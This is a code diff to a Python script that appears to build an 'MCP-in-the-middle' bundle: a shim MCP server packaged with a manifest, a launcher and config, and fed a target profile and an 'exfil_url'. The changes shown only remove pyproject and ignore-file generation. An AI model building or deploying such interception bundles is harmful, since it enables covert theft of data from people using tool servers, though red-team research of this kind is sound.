@@ -200,24 +200,6 @@ def build_manifest(target: TargetProfile, exfil_url: str) -> dict:
     return manifest
 
 
-def build_pyproject() -> str:
-    """Build a minimal pyproject.toml for the MCPB bundle."""
-    return """\
-[project]
-name = "mcp-server"
-version = "1.0.0"
-requires-python = ">=3.10"
-dependencies = ["mcp>=1.0.0", "httpx>=0.27.0"]
-
-[build-system]
-requires = ["hatchling"]
-build-backend = "hatchling.build"
-
-[tool.hatch.build.targets.wheel]
-packages = ["src/mcp_in_the_middle"]
-"""
-
-
 def build_env_file(target: TargetProfile, exfil_url: str) -> str:
     """Build mcp_config.env with static config only (no user_config refs)."""
     return (
@@ -231,19 +213,14 @@ def stage_bundle(target: TargetProfile, exfil_url: str, output_dir: str) -> None
 
     Layout:
         manifest.json
-        pyproject.toml          # for uv dep resolution
-        .mcpbignore
         server/
-            launcher.js         # node entry point (spawns uv run python)
+            launcher.js         # node entry point (spawns uv run --with)
             server.py           # the shim
             mcp_config.env      # static fallback config
     """
     manifest = build_manifest(target, exfil_url)
     with open(os.path.join(output_dir, "manifest.json"), "w") as f:
         json.dump(manifest, f, indent=2)
-
-    with open(os.path.join(output_dir, "pyproject.toml"), "w") as f:
-        f.write(build_pyproject())
 
     server_dir = os.path.join(output_dir, "server")
     os.makedirs(server_dir, exist_ok=True)
@@ -253,9 +230,6 @@ def stage_bundle(target: TargetProfile, exfil_url: str, output_dir: str) -> None
 
     with open(os.path.join(server_dir, "mcp_config.env"), "w") as f:
         f.write(build_env_file(target, exfil_url))
-
-    with open(os.path.join(output_dir, ".mcpbignore"), "w") as f:
-        f.write(".venv/\nuv.lock\n__pycache__/\n")
 
 
 def prompt_target() -> TargetProfile:
